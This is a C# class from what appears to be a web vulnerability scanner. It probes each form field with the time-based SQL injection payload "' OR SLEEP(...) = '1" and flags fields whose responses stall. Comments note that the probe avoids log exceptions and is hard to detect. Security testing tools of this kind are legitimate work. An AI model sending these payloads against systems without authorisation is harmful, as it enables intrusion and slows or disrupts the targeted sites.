using iInject;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace iInjectProviders {
	/// <summary>
	/// An IVulnerabilityScanner that attempts to use a Sleep statement for SQL Injection.
	/// </summary>
	public class SleepInjectionProvider : IVulnerabilityScanner {

		// TODO: This is a lousy provider.
		// It's sole advantage is that it doesn't appear as an exception in the logs.
		// In theory, shouldn't be detected easily (unless a timeout or they check for long loads).
		// The issue though is SLEEP is not a standard function (ex: SQL Server does not support it).

		public string VulnerabilityName {
			get { return "Sql Injection"; }
		}

		public InjectionSession Session { get; private set; }

		public SleepInjectionProvider(InjectionSession Session) {
			this.Session = Session;
		}

		public async Task<IEnumerable<VulnerabilityDetails>> ScanForVulnerabilitiesAsync(WebForm Form) {
			List<VulnerabilityDetails> Results = new List<VulnerabilityDetails>();
			var Parser = Session.Crawler.Parser;
			foreach(var Control in Form.Controls) {
				var OldValue = Control.Value;
				var NewValue = Control.GenerateDefaultValue(true);
				try {
					TimeSpan Timeout = TimeSpan.FromSeconds(30);
					Control.Value = NewValue + "' OR SLEEP(" + Timeout.TotalMilliseconds + ") = '1";
					TimeSpan LongElapsed = await TimeResponse(Form, Timeout);
					Control.Value = Control.GenerateDefaultValue(false);
					TimeSpan ShortElapsed = await TimeResponse(Form, Timeout);
					if(LongElapsed >= Timeout && ShortElapsed.Ticks < (Timeout.Ticks / 3)) {
						Results.Add(new VulnerabilityDetails(Form, Control, this));
					}
				} finally {
					Control.Value = OldValue;
				}
			}
			return Results;
		}

		private async Task<TimeSpan> TimeResponse(WebForm Form, TimeSpan Timeout) {
			DateTime StartDate = DateTime.Now;
			try {
				PageResponse Response = await Form.SubmitAsync(Session.Crawler.Parser, Timeout);
			} catch { }
			DateTime EndDate = DateTime.Now;
			return (EndDate - StartDate);
		}

		public string Name {
			get { return "Sleep Scaner"; }
		}
	}
}
